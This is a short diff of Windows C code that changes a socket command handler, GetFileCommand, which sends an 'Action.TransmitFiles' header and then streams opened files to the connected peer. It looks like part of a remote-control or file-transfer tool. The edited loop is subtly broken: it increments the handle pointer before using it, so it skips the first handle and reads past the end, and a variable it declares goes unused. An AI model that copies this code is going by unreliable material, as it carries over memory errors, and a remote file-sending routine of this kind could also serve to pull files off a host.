@@ -323,6 +323,8 @@ BOOL GetFileCommand(SOCKET* sock, PSTR str) {
 	if(!processHeap)
 		processHeap = GetProcessHeap();
 
+
+	//i know but diz is required
 	HANDLE* fileHandles = (HANDLE*) HeapAlloc(processHeap, 
 										HEAP_GENERATE_EXCEPTIONS |
 										HEAP_ZERO_MEMORY,
@@ -335,20 +337,13 @@ BOOL GetFileCommand(SOCKET* sock, PSTR str) {
 	
 	memcpy(transmissionHeader, "\r\n\r\nAction.TransmitFiles\n", sizeof("\r\n\r\nAction.TransmitFiles\n"));
 
-	/*
-	if(*str == '*') {
-
-	} else {
-		//str parsing:
-		// file.txt file.bin "file with space.bin" *
-	}*/
-
+	strncat(transmissionHeader, "\n\0", 2);
 	WriteConnectionSize(sock, transmissionHeader, strlen(transmissionHeader) + 1);
 	HeapFree(processHeap, 0x0, transmissionHeader);
 	
-	char* tmp = fileHandles;
+	HANDLE* tmp = fileHandles;
 	
-	while(fileHandles++) {
+	while(*fileHandles++) {
 		TransmitFileConnection(sock, *fileHandles);
 		CloseHandle(*fileHandles);
 	}
